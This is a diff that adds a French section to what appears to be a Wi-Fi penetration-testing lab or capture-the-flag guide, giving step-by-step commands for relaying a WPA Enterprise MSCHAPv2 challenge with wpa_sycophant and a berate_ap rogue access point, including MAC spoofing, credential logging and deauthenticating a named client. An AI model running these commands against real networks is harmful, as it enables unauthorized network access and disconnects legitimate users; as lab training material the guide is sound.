@@ -247,9 +247,72 @@ hashcat -a 0 -m 5500 hashcat.5500 rockyou.txt --force
 
 # WPA Enterprise (MGT) - Attaque Relais du challenge NETNTLM
 
-# WPA Enterprise (MGT) - Phishing + RogueAP / Responder + RogueAP
+Pour réaliser cette attaque, nous devons effectuer une attaque par relais. MSCHAPv2 fonctionne de la même manière que NetNTLM, nous pouvons donc réutiliser le challenge du l'AP en le transmettant au client légitime et réutiliser sa réponse pour accéder à l'AP réel. Pour cela, nous utiliserons « wpa_sycophant ».
 
-# WPA Enterprise (MGT) - Récupération de la CA légitime et utilisation sur un RogueAP
+Tout d'abord, nous configurons le nom de l'AP auquel nous voulons nous connecter dans « wpa_sycophant » et nous ajoutons le MAC du faux AP que nous allons créer, donc si on le crée avec wlan1, alors il faut mettre l'@MAC de cette interface dans « bssid_blacklist ». L'objectif étant de ne pas mener l'attaque sur notre RogueAP. Mais d'abord, il faut préparer la conf :
+
+```
+systemctl stop network-manager
+airmon-ng stop wlan1mon
+ip link set wlan1 down
+macchanger -m F0:9F:C2:00:00:00 wlan1
+ip link set wlan1 up
+```
+
+Ensuite : 
+```
+echo '
+network={
+  ssid="wifi-regional-tablets"
+  ## SSID du PA sur lequel on veut relayer l'authentification et ainsi s'y connecter. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  ## Ne pas modifier
+  identity=""
+  anonymous_identity=""
+  password=""
+  eap=PEAP
+  phase1="crypto_binding=0 peaplabel=0"
+  phase2="auth=MSCHAPV2"
+  ## Ici on ne veut pas se connecter à nous-même (RogueAP avec SSID identique que le légitime),
+  ## donc ajouter votre BSSID de votre RogueAP ici (wlan1) :
+  bssid_blacklist=F0:9F:C2:00:00:00
+}
+' > ~/tools/wpa_sycophant/wpa_sycophant_example.conf
+```
+Pour mettre en oeuvre notre RogueAP nous utilisons « berate_ap », très similaire à « eaphammer » dans les sections précédentes.
+
+```
+#Shell 1
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+```
+Assurez-vous de bien compléter le setup notamment avec les informations de certificat.
+
+Sur un nouveau Shell on va désauthentifier le client légitime vulnérable à cette attaque :
+```
+# Shell 2
+airmon-ng start wlan0
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
+```
+
+Enfin il ne reste plus qu'à lancer « wpa_sycophant » et attendre que le client se connecte à « berate_ap » ainsi « wpa_sycophant » va récupérer le résultat du challenge pour s'authentifier sur le point d'accès légitime.
+S'il y a un échec sur « wpa_sycophant » alors modifiez la conf tel que : `phase1="peapver=1"`
+Lorsque indique que la connexion est établie, dans un nouveau Shell, demandez une adresse IP : 
+```
+# Shell 4
+dhclient wlan3 -v
+```
+Et récupérez le flag sur l'interface WEB en .1 :
+
+22. Quel est le FLAG obtenu via l'attaque relais ?
+
+
+
+
+
+
 
 # Annexe wpa_supplicant 
 
